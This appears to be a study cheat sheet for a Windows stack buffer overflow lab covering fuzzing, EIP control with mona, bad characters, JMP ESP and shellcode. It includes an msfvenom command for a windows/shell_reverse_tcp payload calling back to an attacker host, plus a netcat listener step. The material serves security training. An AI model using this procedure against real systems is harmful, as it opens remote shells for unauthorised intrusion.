# bof
## Buffer Overflows

## Setup
* Open Immunity Debugger as admin
* In Immunity Debugger, set a working folder for mona:
```!mona config -set workingfolder c:\mona\%p```

## Fuzzing
* In Kali, create the fuzzer.py script and execute
* Note the size of the largest string sent
* Create a cyclic payload with pattern_create.rb, 400 bytes longer than crashing string size:
```$ msf-pattern_create -l <string+400>```
* Create exploit.py with the generated payload
		
## Control EIP
* Relaunch target.exe and run exploit.py
* In Immunity Debugger, run findmsp:
```!mona findmsp -distance <string+400>```
* Locate "EIP contains normal pattern: <> (offset <>)"
* Alternate technique: Copy contents of EIP and find offset with msf-pattern_offset:
```$ msf-pattern_offset -l <string+400> -q <EIP>```
* Update exploit.py with new values:
  * Set offset variable value in exploit.py to EIP offset value
  * Set payload to empty string
  * Set retn variable to 'BBBB'
* Relaunch target.exe and run exploit.py
* EIP should now be overwritten with 42424242

## Find Bad Characters
* Create a bytearray in Mona:
```!mona bytearray -b "\x00"```

_Note location of 'bytearray.bin' (c:\mona\*\bytearray.bin)_

* In Kali, create and run a python script to generate bad characters:
```python
from __future__ import print_function

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')

print()
```
* Update payload variable in exploit.py with badchars string
* Reload target.exe and run exploit.py
* Note the ESP address
* Run !mona compare with the ESP address
```!mona compare -f C:\mona\*\bytearray.bin -a <ESPaddress>```
* Generate a new bytearray in Mona, excluding all badchars from the comparison result:
```!mona bytearray -b "\x00\x07\x2e\xa0"```
* Remove badchars from exploit.py:
```payload = "<all non-bad characters>"```
*  All bad characters identified when result: "Unmodified"
*  Alternate technique: right-click ESP and select "Follow in Dump".  Inspect hexdump to find missing characters and iterate.

## Jump Point
* Run !mona jmp to identify all jump points with addresses that don't contain badchars:
```!mona jmp -r esp -cpb "\x00\x07\x2e\xa0\"```
* Choose a jmp address and update "retn" variable in exploit.py, reversing the endianness:
  * Mona address: "0x625011af"
  * Python address: "\xaf\x11\x50\x62"

## Generate Payload and NOPs
* Create a payload with msfvenom:
```msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -b "\x00\x07\x08\x2e\x2f\xa0\xa1\xa2\xa3\xa4" -f py```
* Update payload of exploit.py with 'buf' variable definition and set payload = buf
* Set padding variable to 16 NOP bytes:
```padding = "\x90" * 16```

## Exploitation
* Start nc listener on :port
* Reload target.exe and exploit
